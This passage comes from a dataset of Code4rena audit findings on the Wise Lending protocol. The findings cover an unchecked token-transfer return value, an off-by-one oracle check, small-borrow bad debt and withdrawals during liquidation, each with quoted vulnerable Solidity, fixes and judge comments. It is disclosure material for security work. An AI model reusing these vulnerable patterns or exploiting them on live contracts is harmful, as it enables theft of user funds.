details).\n\n### Proof of Concept\n\n> On some ERC-20 tokens, the [`transferFrom()` will return false on failure instead of reverting a transaction](https://github.com/d-xo/weird-erc20?tab=readme-ov-file#no-revert-on-failure).\n\nThe `WiseLending` protocol implements the `TransferHub::_callOptionalReturn()` as a helper function for executing low-level calls. In case the `transferFrom()` returns `false` on failure, the `_callOptionalReturn()` will receive the returned parameters: [`success` `==` true and `returndata` `!=` `bytes(0)`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/TransferHub/CallOptionalReturn.sol#L21).\n\nThen, the `_callOptionalReturn()` will decode the received `returndata` for the success status. If the `transferFrom()` returns `false`, the [results will become `false`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/TransferHub/CallOptionalReturn.sol#L26-L29).\n\nWith the `results` `==` `false`, finally, the `_callOptionalReturn()` will [return `false` to its function caller](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/TransferHub/CallOptionalReturn.sol#L35-L37).\n\nOn the `TransferHelper::_safeTransferFrom()`, I noticed that the function [does not evaluate the return value](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/TransferHub/TransferHelper.sol#L42) (i.e., unchecked return value bug) of the `_callOptionalReturn()`. Subsequently, the `_safeTransferFrom()` cannot detect the token transfer failure if the `transferFrom()` returns `false`.\n\n```solidity\n    // FILE: https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/TransferHub/CallOptionalReturn.sol\n    function _callOptionalReturn(\n        address token,\n        bytes memory data\n    )\n        internal\n        returns (bool call)\n    {\n        (\n            bool success,\n@1          bytes memory returndata //@audit -- On some tokens, the transferFrom() will return false instead of reverting a transaction\n        ) = token.call(\n            data\n        );\n\n@2      bool results = returndata.length == 0 || abi.decode(\n@2          returndata, //@audit -- If the transferFrom() returns false, the results == false\n@2          (bool)\n@2      );\n\n        if (success == false) {\n            revert();\n        }\n\n@3      call = success\n@3          && results // @audit -- If the results == false, the _callOptionalReturn() will return false\n@3          && token.code.length > 0;\n    }\n\n    ...\n\n    // FILE: https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/TransferHub/TransferHelper.sol\n    function _safeTransferFrom(\n        address _token,\n        address _from,\n        address _to,\n        uint256 _value\n    )\n        internal\n    {\n@4      _callOptionalReturn( //@audit -- The _safeTransferFrom() cannot detect the token transfer failure if the transferFrom() returns false instead of reverting a transaction due to the unchecked return value bug\n            _token,\n            abi.encodeWithSelector(\n                IERC20.transferFrom.selector,\n                _from,\n                _to,\n                _value\n            )\n        );\n    }\n```\n\n`@1 -- On some tokens, the transferFrom() will return false instead of reverting a transaction`: see [here](<https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/TransferHub/CallOptionalReturn.sol#L21>).\n\n`@2 -- If the transferFrom() returns false, the results == false`: see [here](<https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/TransferHub/CallOptionalReturn.sol#L26-L29>).\n\n`@3 -- If the results == false, the _callOptionalReturn() will return false`: see [here](<https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/TransferHub/CallOptionalReturn.sol#L35-L37>).\n\n`@4 -- The _safeTransferFrom() cannot detect the token transfer failure if the transferFrom() returns false instead of reverting a transaction due to the unchecked return value bug`: see [here](<https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/TransferHub/TransferHelper.sol#L42>).\n\nNote: Please refer to the `Impact` section for a complete list of the functions directly invoking the vulnerable `_safeTransferFrom()`.\n\nThe following briefly analyzes 2 of the 17 functions that would affect the exploitation as examples:\n\n- Due to the unchecked return value bug, the [`WiseCore::_coreLiquidation()`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseCore.sol#L674-L679) cannot be aware of the token transfer failure. Thus, a rogue liquidator can steal collateral from the target liquidable position without supplying any debt token (`tokenToPayback`).\n\n- On the [`WiseLending::depositExactAmount()`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseLending.sol#L476-L481), a rogue depositor can increase their collateral without spending any token.\n\n```solidity\n    // FILE: https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseCore.sol\n    function _coreLiquidation(\n        CoreLiquidationStruct memory _data\n    )\n        internal\n        returns (uint256 receiveAmount)\n    {\n        ...\n\n@5      _safeTransferFrom( //@audit -- Liquidator can steal collateral (_receiveToken) from the target liquidable position\n@5          _data.tokenToPayback,\n@5          _data.caller,\n@5          address(this),\n@5          _data.paybackAmount\n@5      );\n\n        ...\n    }\n\n    ...\n\n    // FILE: https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseLending.sol\n    function depositExactAmount(\n        uint256 _nftId,\n        address _poolToken,\n        uint256 _amount\n    )\n        public\n        syncPool(_poolToken)\n        returns (uint256)\n    {\n        uint256 shareAmount = _handleDeposit(\n            msg.sender,\n            _nftId,\n            _poolToken,\n            _amount\n        );\n\n@6      _safeTransferFrom( //@audit -- Depositor can increase their collateral without supplying any token\n@6          _poolToken,\n@6          msg.sender,\n@6          address(this),\n@6          _amount\n@6      );\n\n        return shareAmount;\n    }\n```\n\n`@5 -- Liquidator can steal collateral (_receiveToken) from the target liquidable position`: see [here](<https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseCore.sol#L674-L679>).\n\n`@6 -- Depositor can increase their collateral without supplying any token`: see [here](<https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseLending.sol#L476-L481>).\n\n### Recommended Mitigation Steps\n\nImprove the `_safeTransferFrom()` by checking the return value from the `_callOptionalReturn()` and reverting a transaction if it is `false`.\n\n```diff\n    function _safeTransferFrom(\n        address _token,\n        address _from,\n        address _to,\n        uint256 _value\n    )\n        internal\n    {\n-       _callOptionalReturn(\n+       bool success = _callOptionalReturn(\n            _token,\n            abi.encodeWithSelector(\n                IERC20.transferFrom.selector,\n                _from,\n                _to,\n                _value\n            )\n        );\n\n+       require(success, \"Token transfer failed\");\n    }\n```\n\n### Assessed type\n\nInvalid Validation\n\n**[vm06007 (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/245#issuecomment-2032204776):**\n > This then leads to some tokens unusable (like USDT, for example) and this topic was already discussed severely during hats competition where I can send links to findings, so should be scraped in my opinion. Also sufficient checks are already done in `_callOptionalReturn` directly.\n\n**[vm06007 (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/245#issuecomment-2090406869):**\n> Mitigated [here](https://github.com/wise-foundation/lending-audit/commit/ac68b5a93976969d582301fee9f873ecec606df9).\n> \n> Additionally, `WiseLending` is not meant to be used with corrupted tokens that have unsupported transfer/transferFrom implementations.\n***\n\n",
      "summary": "\nThis bug report describes an issue with the `WiseLending` protocol where the `transferFrom()` function may return `false` instead of reverting a transaction. This can lead to problems with certain ERC-20 tokens and can be exploited by attackers. The report lists the specific functions in the protocol that are affected by this issue and provides a proof of concept for how it can be exploited. The report also mentions that this issue has been discussed before and has been mitigated in the latest version of the protocol.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wise Lending",
      "source_link": "https://code4rena.com/reports/2024-02-wise-lending",
      "github_link": "https://github.com/code-423n4/2024-02-wise-lending-findings/issues/245",
      "tags": [],
      "finders": [
        "nonseodion",
        "josephdara",
        "Mrxstrange",
        "Jorgect",
        "unix515",
        "0x11singh99",
        "serial-coder",
        "Rhaydden"
      ]
    },
    {
      "id": "32095",
      "title": "[M-06] Off-by-one bug prevents the `_compareMinMax()` from detecting Chainlink aggregators' circuit-breaking events",
      "impact": "MEDIUM",
      "content": "\nThe `WiseLending` protocol implements the `OracleHelper::_compareMinMax()` to detect the circuit-breaking events of Chainlink aggregators when an asset price goes outside of pre-determined min/max values. For instance, in case of a significant price drop (e.g., LUNA crash), the asset price reported by the Chainlink price feed will continue to be at the pre-determined `minAnswer` instead of the actual price.\n\nThe `_compareMinMax()`'s objective is to prevent such a crash event that would allow a user to borrow other assets with the wrongly reported asset price. For more, refer to the case of [Venus Protocol and Blizz Finance in the crash of LUNA](https://rekt.news/venus-blizz-rekt/).\n\nHowever, the current implementation of the `_compareMinMax()` got an off-by-one bug that would prevent the function from detecting the mentioned Chainlink aggregators' circuit-breaking events. In other words, the function will not revert the transaction if the flash crash event occurs as expected.\n\n### Proof of Concept\n\nIn the flash crash event, the Chainlink price feed will continue to return the `_answer` at the pre-determined `minAnswer` instead of the actual price.  In other words, the possible minimum value of the `_answer` would be `minAnswer`.\n\nSince the `_compareMinMax()` does not include the case of [`_answer == minAnswer`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseOracleHub/OracleHelper.sol#L97) (also, `_answer` `==` `maxAnswer`), the function could not detect whether or not the crash event happens.\n\n```solidity\n    function _compareMinMax(\n        IAggregator _tokenAggregator,\n        int192 _answer\n    )\n        internal\n        view\n    {\n        int192 maxAnswer = _tokenAggregator.maxAnswer();\n        int192 minAnswer = _tokenAggregator.minAnswer();\n\n@>      if (_answer > maxAnswer || _answer < minAnswer) {\n            revert OracleIsDead();\n        }\n    }\n```\n\n<https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseOracleHub/OracleHelper.sol#L97>\n\n### Recommended Mitigation Steps\n\nAdd the cases `_answer` `==` `minAnswer` and `_answer` `==` `maxAnswer` like the snippet below:\n\n```diff\n    function _compareMinMax(\n        IAggregator _tokenAggregator,\n        int192 _answer\n    )\n        internal\n        view\n    {\n        int192 maxAnswer = _tokenAggregator.maxAnswer();\n        int192 minAnswer = _tokenAggregator.minAnswer();\n\n-       if (_answer > maxAnswer || _answer < minAnswer) {\n+       if (_answer >= maxAnswer || _answer <= minAnswer) {\n            revert OracleIsDead();\n        }\n    }\n```\n\n### Assessed type\n\nOracle\n\n**[Trust (judge) decreased severity to Low](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/251#issuecomment-2021143688)**\n\n**[serial-coder (warden) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/251#issuecomment-2022567278):**\n > @Trust - This is a valid medium issue as the `_compareMinMax()` was implemented incorrectly.\n> \n> Specifically, the `_compareMinMax()` does not include the edge cases **`_answer` `==` `minAnswer`** and **`_answer` `==` `maxAnswer`**. So, the function cannot detect the `minAnswer` or `maxAnswer` as expected.\n> \n> To elaborate, for example, the `minAnswer` the aggregator can report for the `LINK` (one of the tokens in scope) is [100000000000000](https://etherscan.io/address/0xbba12740DE905707251525477bAD74985DeC46D2#readContract#F19) (`10 ** 14`). Suppose, in the event of a flash crash, the price of the `LINK` token drops significantly below the `minAnswer` (below `10 ** 14`).\n> \n> However, the price feed will continue to report the pre-determined `minAnswer` (not the actual price). Since the `_compareMinMax()` does not include the case `_answer` `==` `minAnswer`, it cannot detect this flash crash event.\n> \n> In other words, the least reported price (i.e., `_answer`) will be the pre-determined `minAnswer`, not the actual price. Thus, the `_compareMinMax()` will never enter the [`if case` and revert the transaction](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseOracleHub/OracleHelper.sol#L98) as expected because the `_answer` will never be less than the aggregator's `minAnswer`.\n> \n> ```solidity\n>     function _compareMinMax(\n>         IAggregator _tokenAggregator,\n>         int192 _answer\n>     )\n>         internal\n>         view\n>     {\n>         int192 maxAnswer = _tokenAggregator.maxAnswer();\n>         int192 minAnswer = _tokenAggregator.minAnswer();\n> \n> @>      if (_answer > maxAnswer || _answer < minAnswer) { //@audit -- The least reported price (i.e., `_answer`) will be the `minAnswer`. So, the function will never enter the \" if \" case\n>             revert OracleIsDead();\n>         }\n>     }\n> ```\n> \n> An example reference is [here](https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/18). As you can see, their recommendation includes the edge cases `_answer` `==` `minAnswer` and `_answer` `==` `maxAnswer`.\n> \n> *Note: to view the provided image, please see the original comment [here](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/251#issuecomment-2022567278).*\n> \n> **Further on the TWAP Oracle:** \n> \n> Someone may argue that the protocol has the TWAP. \n> \n> I want to point out that the [TWAP setup for each price feed is only optional](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseOracleHub/OracleHelper.sol#L144-L148). If the TWAP is not set, the price deviation comparison mechanism between the TWAP's price and Chainlink's price [will not be triggered](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseOracleHub/OracleHelper.sol#L161-L171). For this reason, this issue deserves a Medium severity.\n\n**[Trust (judge) increased severity to Medium and commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/251#issuecomment-2022731180):**\n > The impact demonstrated is an incorrect validation check, which in the case `maxAnswer/minAnswer` are used by the feed, will make detecting black swans fail. As the team assumes those protections are in place, Medium severity is appropriate.\n\n**[00xSEV (warden) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/251#issuecomment-2024357910):**\n > @Trust - Could you double-check that it's a valid issue? If we follow the link from the [Chainlink docs](https://docs.chain.link/data-feeds#monitoring-data-feeds) and check the code [here](https://github.com/smartcontractkit/libocr/blob/9e4afd8896f365b964bdf769ca28f373a3fb0300/contract/OffchainAggregator.sol#L68-L69) and [here](https://github.com/smartcontractkit/libocr/blob/9e4afd8896f365b964bdf769ca28f373a3fb0300/contract/OffchainAggregator.sol#L640):\n>\n> ```solidity\n>    * @param _minAnswer lowest answer the median of a report is allowed to be\n>    * @param _maxAnswer highest answer the median of a report is allowed to be\n> ```\n> \n> ```solidity\n> require(minAnswer <= median && median <= maxAnswer, \"median is out of min-max range\");\n> ```\n> \n> It means that if `median == minAnswer` or `median == maxAnswer` it still a valid value and we don't have to revert.\n\n**[serial-coder (warden) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/251#issuecomment-2024368780):**\n > @00xSEV - The least reported price will be the pre-determined `minAnswer`. If you do not include the case `==`, the `_compareMinMax()` will never enter the [`if case` and revert the transaction](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseOracleHub/OracleHelper.sol#L98). You cannot detect the black swan events without it.\n> \n> The reported price will never be less than the `minAnswer`. (Without the `==`, the `if` condition will always be `false`).\n> \n> ```solidity\n>     function _compareMinMax(\n>         IAggregator _tokenAggregator,\n>         int192 _answer\n>     )\n>         internal\n>         view\n>     {\n>         int192 maxAnswer = _tokenAggregator.maxAnswer();\n>         int192 minAnswer = _tokenAggregator.minAnswer();\n> \n> @>      if (_answer > maxAnswer || _answer < minAnswer) { //@audit -- The least reported price (i.e., `_answer`) will be the `minAnswer`. So, the function will never enter the \" if \" case\n>             revert OracleIsDead();\n>         }\n>     }\n> ```\n\n**[Wise Lending commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/251#issuecomment-2082910582):**\n> Mitigated [here](https://github.com/wise-foundation/lending-audit/commit/ac68b5a93976969d582301fee9f873ecec606df9).\n\n***\n\n",
      "summary": "\nThe `WiseLending` protocol has a bug in the implementation of its `OracleHelper::_compareMinMax()` function. This function is supposed to prevent flash crash events by detecting when the price of an asset reported by a Chainlink price feed goes outside of predetermined min/max values. However, due to an off-by-one bug, the function is not able to detect these events. This means that in the event of a flash crash, the price reported by the Chainlink price feed will continue to be the predetermined `minAnswer` instead of the actual price, allowing users to borrow assets at the wrong price. The recommended mitigation is to add the edge cases `_answer` `==` `minAnswer` and `_answer` `==` `maxAnswer` to the function. The bug has been assessed as a medium severity issue and has been mitigated by the team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wise Lending",
      "source_link": "https://code4rena.com/reports/2024-02-wise-lending",
      "github_link": "https://github.com/code-423n4/2024-02-wise-lending-findings/issues/251",
      "tags": [],
      "finders": [
        "serial-coder"
      ]
    },
    {
      "id": "32094",
      "title": "[M-05] The protocol allows borrowing small positions that can create bad debt",
      "impact": "MEDIUM",
      "content": "\nThe `WiseLending` protocol allows users to borrow small positions. Even if the protocol has a minimum deposit (collateral) amount check to mitigate the small borrowing position from creating bad debt, this protection can be bypassed.\n\nWith a small borrowing position, there is no incentive for a liquidator to liquidate the position, as the liquidation profit may not cover the liquidation cost (gas). As a result, small liquidable positions will not be liquidated, leaving bad debt to the protocol.\n\n### Proof of Concept\n\nThe protocol allows users to borrow small positions since no minimum borrowing amount is checked in the [`WiseSecurity::checksBorrow()`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseSecurity/WiseSecurity.sol#L306-L330).\n\n```solidity\n// FILE: https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseSecurity/WiseSecurity.sol\nfunction checksBorrow(\n    uint256 _nftId,\n    address _caller,\n    address _poolToken\n)\n    external\n    view\n    returns (bool specialCase) //@audit -- No minimum borrowing amount check\n{\n    _checkPoolCondition(\n        _poolToken\n    );\n\n    checkTokenAllowed(\n        _poolToken\n    );\n\n    if (WISE_LENDING.verifiedIsolationPool(_caller) == true) {\n        return true;\n    }\n\n    if (WISE_LENDING.positionLocked(_nftId) == true) {\n        return true;\n    }\n}\n```\n\n[No minimum borrowing amount check](<https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseSecurity/WiseSecurity.sol#L306-L330>).\n\nEven if the protocol has a [minimum deposit (collateral) amount check](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseCore.sol#L260-L263) in the `WiseCore::_checkDeposit()` to mitigate the small borrowing position from creating bad debt, this protection can be easily bypassed.\n\nThe `WiseCore::_checkMinDepositValue()` is a core function that checks a minimum deposit (collateral) amount. By default, [this deposit amount check would be overridden (disabled)](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseSecurity/WiseSecurity.sol#L1100-L1102). Even though [this deposit amount check will be enabled](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseSecurity/WiseSecurity.sol#L1104-L1106), this protection can be bypassed by withdrawing the deposited fund later, since there is no minimum withdrawal amount check in the [`WiseSecurity::checksWithdraw()`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseSecurity/WiseSecurity.sol#L237-L270).\n\n```solidity\n    // FILE: https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseCore.sol\n    function _checkDeposit(\n        uint256 _nftId,\n        address _caller,\n        address _poolToken,\n        uint256 _amount\n    )\n        internal\n        view\n    {\n\n        if (WISE_ORACLE.chainLinkIsDead(_poolToken) == true) {\n            revert DeadOracle();\n        }\n\n        _checkAllowDeposit(\n            _nftId,\n            _caller\n        );\n\n        _checkPositionLocked(\n            _nftId,\n            _caller\n        );\n\n@1      WISE_SECURITY.checkPoolWithMinDeposit( //@audit -- Even if there is a minimum deposit amount check, this protection can be bypassed\n@1          _poolToken,\n@1          _amount\n@1      );\n\n        _checkMaxDepositValue(\n            _poolToken,\n            _amount\n        );\n    }\n\n    // FILE: https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseSecurity/WiseSecurity.sol\n    function _checkMinDepositValue(\n        address _token,\n        uint256 _amount\n    )\n        private\n        view\n        returns (bool)\n    {\n@2      if (minDepositEthValue == ONE_WEI) { //@audit -- By default, the minimum deposit amount check would be overridden (disabled)\n@2          return true;\n@2      }\n\n@3      if (_getTokensInEth(_token, _amount) < minDepositEthValue) { //@audit -- Even though the minimum deposit amount check will be enabled, this protection can be bypassed by withdrawing the deposited fund later\n@3          revert DepositAmountTooSmall();\n@3      }\n\n        return true;\n    }\n```\n\n`@1 -- Even if there is a minimum deposit amount check, this protection can be bypassed`: see [here](<https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseCore.sol#L260-L263>).\n\n`@2 -- By default, the minimum deposit amount check would be overridden (disabled)`: see [here](<https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseSecurity/WiseSecurity.sol#L1100-L1102>).\n\n`@3 -- Even though the minimum deposit amount check will be enabled, this protection can be bypassed by withdrawing the deposited fund later`: see [here](<https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseSecurity/WiseSecurity.sol#L1104-L1106>).\n\nAs you can see, there is no minimum withdrawal amount check in the [`WiseSecurity::checksWithdraw()`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseSecurity/WiseSecurity.sol#L237-L270). Hence, a user can deposit collateral at or above the minimum deposit amount (i.e., `minDepositEthValue`) and then withdraw the deposited fund to be under the `minDepositEthValue`. Later, they can borrow a small amount with small collateral.\n\nWith a small borrowing position (and small collateral), there is no incentive for a liquidator to liquidate the position, as the liquidation profit may not cover the liquidation cost (gas). As a result, small liquidable positions will not be liquidated, leaving bad debt to the protocol.\n\n```solidity\n// FILE: https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseSecurity/WiseSecurity.sol\nfunction checksWithdraw(\n    uint256 _nftId,\n    address _caller,\n    address _poolToken\n)\n    external\n    view\n    returns (bool specialCase) //@audit -- No minimum withdrawal amount check\n{\n    if (_checkBlacklisted(_poolToken) == true) {\n\n        if (overallETHBorrowBare(_nftId) > 0) {\n            revert OpenBorrowPosition();\n        }\n\n        return true;\n    }\n\n    if (WISE_LENDING.verifiedIsolationPool(_caller) == true) {\n        return true;\n    }\n\n    if (WISE_LENDING.positionLocked(_nftId) == true) {\n        return true;\n    }\n\n    if (_isUncollateralized(_nftId, _poolToken) == true) {\n        return true;\n    }\n\n    if (WISE_LENDING.getPositionBorrowTokenLength(_nftId) == 0) {\n        return true;\n    }\n}\n```\n\n[No minimum withdrawal amount check](<https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseSecurity/WiseSecurity.sol#L237-L270>).\n\n### Recommended Mitigation Steps\n\nImplement the **minimum borrowing amount check** to limit the minimum size of borrowing positions.\n\n**[vonMangoldt (Wise Lending) commented via duplicate issue #277](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/277#issuecomment-2004003575):**\n> Can also be circumvented by just paying back after borrowing. Doesn't really add any value, in my opinion.\n\n**[Trust (judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/255#issuecomment-2020946526):**\n > The bug class is valid, in my honest opinion; as either liquidator will liquidate at a loss or protocol will be losing money to protect from bad debt over time.\n\n**[Wise Lending commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/255#issuecomment-2082909729):**\n> Mitigated [here](https://github.com/wise-foundation/lending-audit/commit/ac68b5a93976969d582301fee9f873ecec606df9).\n\n***\n\n",
      "summary": "\nThe WiseLending protocol has a bug that allows users to borrow small amounts without proper collateral, which can lead to bad debt for the protocol. This is because there is no minimum borrowing amount check in the protocol, and even if there is a minimum deposit amount check, it can be easily bypassed. This means that a user can deposit a small amount and then withdraw it later, leaving the protocol vulnerable to bad debt. The recommended solution is to implement a minimum borrowing amount check to limit the size of borrowing positions. ",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wise Lending",
      "source_link": "https://code4rena.com/reports/2024-02-wise-lending",
      "github_link": "https://github.com/code-423n4/2024-02-wise-lending-findings/issues/255",
      "tags": [],
      "finders": [
        "SBSecurity",
        "serial-coder"
      ]
    },
    {
      "id": "32093",
      "title": "[M-04] Withdrawing uncollateralized deposits is possible even though the position is in liquidation mode",
      "impact": "MEDIUM",
      "content": "\nUsers can withdraw uncollateralized deposits even though their position is liquidable, [as opposed to the README](https://github.com/code-423n4/2024-02-wise-lending/blob/main/README.md?plain=1#L137). If the position is in liquidation mode, users should use their uncollateralized deposits to avoid liquidation instead of removing them.\n\n### Proof of Concept\n\nWhen withdrawing deposits from public pools, at the end of the tx is executed the [`WiseLending._healthStateCheck() function`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L77-L90), which depending on the value of the `powerFarmCheck` will determine if the position's collateral is enough to cover the borrows.\n\n- If `powerFarmCheck` is true, it will use the `bare` value of the collateral; meaning, the `collateralFactor` is not applied to the collateral's value.\n- If `powerFarmCheck` is false, it will use the `weighted` value of the collateral; meaning, the `collateralFactor` is applied to the collateral's value.\n\nWhen withdrawing an uncollateralized deposit, the [`WiseCore._coreWithdrawToken() function`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseCore.sol#L44-L100) calls the [`WiseSecurity.checksWithdraw() function`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseSecurity/WiseSecurity.sol#L237-L270) to determine the value of the `powerFarmCheck`. If the pool from where the tokens are being withdrawn is uncollateralized, the `powerFarmCheck` will be set to `true`, which will cause that the [`WiseLending._healthStateCheck() function`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L77-L90) uses the `bare` value of the full collateral to determine if the collateral can cover the existing borrows.\n\n**Using the bare value of the collateral does not accurately reflect if a position is liquidable or not**, the liquidation's logic in the [`WiseSecurity.checksLiquidation() function`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseSecurity/WiseSecurity.sol#L105-L137) uses the `weightedCollateral` instead of the `bareCollateral` to determine if the position is liquidable or not. This difference to determine if the position's collateral can cover the borrows when withdrawing uncollateralized deposits and when doing liquidation causes a discrepancy to allow the withdrawal of uncollateralized deposits even though the position is in liquidation mode.\n\nFor example, a user requests a withdrawal of an uncollateralized deposit in a position with the below values:\n\n- `1.5e18` ETH of `bare collateral`.\n- `1.2e18` ETH of `weightedCollateral`.\n- `1.3e18` ETH of `borrows`.\n    - The withdrawal will be allowed even though the position is in liquidation mode. Because of the `powerFarmCheck` being set to `true`, the [`WiseLending._healthStateCheck() function`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L77-L90) will check if 95% of the `bareCollateral` can cover the borrows, 95% of `1.5e18` ETH would be `1.425e18` ETH. Thus, the withdrawal will be possible, even though the position is in liquidation mode.\n\n`WiseSecurity.sol`:\n\n```\nfunction checksWithdraw(\n    ...\n)\n    ...\n{\n    ...\n\n    if (_isUncollateralized(_nftId, _poolToken) == true) {\n        return true;\n    }\n\n    ...\n}\n```\n\n```\n    function _getState(\n        uint256 _nftId,\n        bool _powerFarm\n    )\n        internal\n        view\n        returns (bool)\n    {\n        ...\n\n        //@audit-info => If `powerFarmCheck` is true, overalCollateral will be computed using the value of the `bareCollateral`\n        //@audit-info => If `powerFarmCheck` is false, overalCollateral will be computed using the value of the `weightedCollateral`\n\n        uint256 overallCollateral = _powerFarm == true\n            ? overallETHCollateralsBare(_nftId)\n            : overallETHCollateralsWeighted(_nftId);\n\n        //@audit-info => If 95% of the overalCollateral > borrowAmount, withdrawal will be allowed!\n        return overallCollateral\n            * BORROW_PERCENTAGE_CAP\n            / PRECISION_FACTOR_E18\n            < borrowAmount;\n    }\n```\n\nNow, when using the same values but for a liquidation, we have that the `weightedCollateral` is not enough to cover the borrows; thus, the position is liquidable.\n\n`WiseSecurity.sol`:\n\n```\n    function checksLiquidation(\n        ...\n    )\n        external\n        view\n    {\n        ...\n\n        //@audit-info => When doing liquidations, the value of the `weightedCollateral` is used to determine if the position is liquidable or not!\n        canLiquidate(\n            borrowETHTotal,\n            weightedCollateralETH\n        );\n\n        ...\n    }\n```\n\n### Recommended Mitigation Steps\n\nIf the protocol wants to enforce that users use their uncollateralized deposits to avoid liquidations when the positions are liquidable, don't set to `true` the `powerFarmCheck` when doing withdrawals for uncollateralized deposits. Allow the [`WiseLending._healthStateCheck() function`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L77-L90) to validate if the position is indeed in liquidation mode by using the `weightedCollateral` instead of the `bareCollateral` value.\n\n`WiseSecurity.sol`:\n```\n    function checksWithdraw(\n        ..\n    )\n        ..\n    {\n        ...\n\n    -   if (_isUncollateralized(_nftId, _poolToken) == true) {\n    -       return true;\n    -   }\n\n        ...\n    }\n```\n\n### Assessed type\n\nContext\n\n**[vonMangoldt (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/260#issuecomment-2006323053):**\n > That's no issue since the additional check is reflecting a higher %. We will keep it like that.\n\n**[Wise Lending commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/260#issuecomment-2082907612):**\n> Mitigated [here](https://github.com/wise-foundation/lending-audit/commit/ac68b5a93976969d582301fee9f873ecec606df9).\n\n***\n\n",
